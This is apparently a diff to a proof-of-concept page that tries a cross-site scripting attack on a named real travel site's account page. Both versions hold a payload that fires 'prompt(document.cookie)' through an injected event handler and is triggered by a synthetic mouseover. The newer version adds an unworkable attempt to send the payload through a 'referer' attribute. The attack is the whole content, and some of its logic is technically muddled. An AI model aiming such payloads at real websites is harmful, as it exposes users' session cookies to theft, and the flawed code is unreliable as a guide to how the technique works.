@@ -10,19 +10,31 @@
     document.addEventListener("DOMContentLoaded", function() {
         document.getElementById("redirectLink").addEventListener("click", function() {
             // Redirect to the target URL
-            window.location.href = "http://travelpirates.hometogo.com/account/";
+            window.location.href = "http://travelpirates.hometogo.com/account/<><";
         });
         
         // After the page loads on their domain, simulate the hover event with the payload
         window.addEventListener("load", function() {
-            var hoverEvent = new Event("mouseover");
-            var link = document.getElementById("redirectLink");
+            var link = document.createElement("a");
+            link.href = "http://travelpirates.hometogo.com/account/><>";
+            link.setAttribute("id", "xssLink");
+            document.body.appendChild(link);
             
-            // Add your payload to the link's innerHTML
-            link.innerHTML = 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss';
+            var hoverEvent = new MouseEvent("mouseover", {
+                bubbles: true,
+                cancelable: true,
+                view: window
+            });
             
-            // Dispatch the hover event
-            link.dispatchEvent(hoverEvent);
+            // Add a delay to ensure the hover event happens after the page load
+            setTimeout(function() {
+                // Add your payload to the Referer header
+                link.setAttribute("referrerpolicy", "unsafe-url");
+                link.setAttribute("referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
+                
+                // Dispatch the hover event
+                link.dispatchEvent(hoverEvent);
+            }, 5000);
         });
     });
     </script>
